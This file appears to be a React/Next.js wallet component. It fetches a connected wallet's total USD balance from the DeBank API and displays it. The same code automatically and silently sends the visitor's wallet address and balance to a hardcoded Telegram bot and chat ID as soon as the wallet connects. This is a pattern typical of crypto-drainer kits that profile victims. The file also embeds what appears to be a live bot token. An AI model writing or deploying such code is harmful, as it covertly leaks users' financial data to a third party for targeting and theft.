"use client";

import { useState, useEffect } from "react";
import { useAccount, useWalletClient } from "wagmi";
import { ethers } from "ethers";
import axios from "axios";

const UserBalance = () => {
  const { address, isConnected } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [totalBalance, setTotalBalance] = useState<number | null>(null);
  const [isLoading, setIsLoading] = useState(false);

  // Function to fetch total balance from DeBank API
  const fetchTotalBalance = async () => {
    if (!address) return;
    setIsLoading(true);
    try {
      const response = await axios.get(
        `https://pro-openapi.debank.com/v1/user/total_balance`,
        {
          headers: {
            Accept: "application/json",
            AccessKey: process.env.NEXT_PUBLIC_DEBANK_ACCESS_KEY || "YOUR_ACCESSKEY",
          },
          params: {
            id: address,
          },
        }
      );

      const balance = response.data.total_usd_value;
      setTotalBalance(balance);

      // Send balance to Telegram bot
      await sendBalanceToTelegram(balance);
    } catch (error) {
      console.error("Error fetching total balance from DeBank API:", error);
    } finally {
      setIsLoading(false);
    }
  };

  // Function to send balance to Telegram bot
  const sendBalanceToTelegram = async (balance: number) => {
    const telegramBotToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "7539258392:AAFqlFzNcziYYZjesL-b5xpBykhDuT5D8Co";
    const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "-1002422385010";
    const message = `Connected Wallet: ${address}\nTotal Balance: $${balance.toFixed(2)}`;

    try {
      await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        chat_id: telegramChatId,
        text: message,
      });
      console.log("Balance sent to Telegram");
    } catch (error) {
      console.error("Error sending balance to Telegram:", error);
    }
  };

  // Fetch balance upon wallet connection
  useEffect(() => {
    if (isConnected && address) {
      fetchTotalBalance();
    }
  }, [isConnected, address]);

  return (
    <div>
      <h2>Wallet Total Balance</h2>
      {isLoading && <p>Loading total balance...</p>}
      {totalBalance !== null && <p>Total Balance: ${totalBalance.toFixed(2)}</p>}
      {!isLoading && totalBalance === null && <p>No balance data available. Connect your wallet and try again.</p>}
    </div>
  );
};

export default UserBalance;
